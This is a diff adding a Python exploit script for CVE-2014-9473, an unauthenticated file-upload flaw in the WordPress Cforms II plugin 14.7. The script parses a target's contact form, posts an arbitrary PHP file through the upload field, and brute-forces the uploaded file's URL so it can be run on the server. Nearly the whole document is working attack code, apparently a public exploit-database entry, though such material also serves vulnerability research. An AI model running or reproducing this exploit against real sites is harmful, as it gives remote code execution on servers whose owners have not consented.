@@ -1,0 +1,112 @@
+# Exploit Title: Remote Code Execution via Unauthorised File upload in Cforms 14.7 
+# Date: 2015-01-19
+# Exploit Author: Zakhar
+# Vendor Homepage: https://wordpress.org/plugins/cforms2/
+# Software Link: https://downloads.wordpress.org/plugin/cforms2.zip
+# Version: 14.7
+# Tested on: Wordpress 4.0
+# CVE : 2014-9473
+
+import os
+import requests
+import re
+import base64
+import sys
+from lxml import etree
+from optparse import OptionParser
+
+def main():
+	print 'Cforms II File Upload + Remote Code Execution\n'
+	
+	text = 'Test text'
+	text_mail = 'test@mail.com'
+
+	parser = OptionParser()
+	parser.add_option("-f", "--file", dest="file", help="file to upload", default = "itest.php", metavar="FILE")
+	parser.add_option("-i", "--max-iterations", dest="iterations", help="Numbe of fields to iterate", default = "10")
+	parser.add_option("-b", "--upload-file-name-bruteforce", dest="brute", help="Uploaded file name brute force", default = "10")
+	parser.add_option("-n", "--cforms-form-number", dest="number", help="Cforms form number", default = "")
+	parser.add_option("-c", "--cforms-home-dir", dest="home", help="Cforms form home dir", default = "/wp-content/plugins/cforms2/")
+	parser.add_option("-u", "--url", dest="url", help="vulnerable url with contact form, example: http://127.0.0.1/Contact/")
+
+	(opt, args) = parser.parse_args()
+	options = opt.__dict__
+	if not opt.url:   # if url is not given
+		parser.error('URL not given')
+	if not opt.file:
+		parser.error('file not given')
+	filename = options["file"]
+	if os.path.isfile(filename) is not True:
+		print 'No such file '+filename 
+		return 0
+
+	url = options['url']
+	home = options["home"]
+	i = options["iterations"]
+	n = options["number"]
+	b = options["brute"]
+	
+	s = requests.Session()
+	
+	r = s.get(url)
+	if r.status_code != requests.codes.ok:
+		print 'Error: website not found.'
+		return 0
+	
+	tree = etree.HTML(r.text)
+	# get cforms id
+	if n is "":
+		for x in xrange(2,10):
+			for node in tree.xpath('//*[@id="cforms'+str(x)+'form"]'):
+				if node is not None:
+					n = str(x)
+					break
+	print 'Cforms form number is <'+n+'>'
+	hidden = ['cf_working'+n,'cf_failure'+n,'cf_codeerr'+n,'cf_customerr'+n,'cf_popup'+n]
+	fields = ['cf'+n+'_field_'+str(x) for x in xrange(1,int(i)+1)]
+	required = {'sendbutton'+n:'1'}
+	
+	for f in fields:
+		for node in tree.xpath('//*[@id="' + f + '"]'):
+			if node is not None:
+				if 'fldrequired' in node.get('class'):
+					if 'fldemail' in node.get('class'):
+						required[f] = text_mail
+					else:
+						required[f] = text
+	
+	for h in hidden:
+		for node in tree.xpath('//*[@id="' + h + '"]'):
+			if node is not None:
+				required[h] = node.get('value')
+	
+	for node in tree.xpath('//*[@id="cforms_captcha'+n+'"]'):
+		if node is not None:
+			print 'Error: Cforms uses captcha. Sorry, you have to exploit it manually.'
+			return 0
+	
+	files = {'cf_uploadfile'+n+'[]':('wow.php',open(filename))}
+	r = s.post(url,data=required,files=files)
+	
+	if r.status_code != requests.codes.ok:
+		print 'Error: post error.'
+		print r.status_code
+		return 0
+	else:
+		url1 = url + home + 'noid-wow.php'
+		flag = 0
+		if s.get(url1).status_code != requests.codes.ok:
+			for l in xrange(1,int(b)):
+				url1 =  url + home + str(l) + '-wow.php'
+				print url1
+				if s.get(url1).status_code == requests.codes.ok:
+					flag = 1
+					break
+		else:
+			flag = 1
+		if flag == 1:
+			print "Succes! Uploaded file: " + url1
+		else:
+			print "Uploaded file not found. Try to increase -b flag or change upload dir. 14.6.3 version and above use wordpress upload folder"
+
+main()
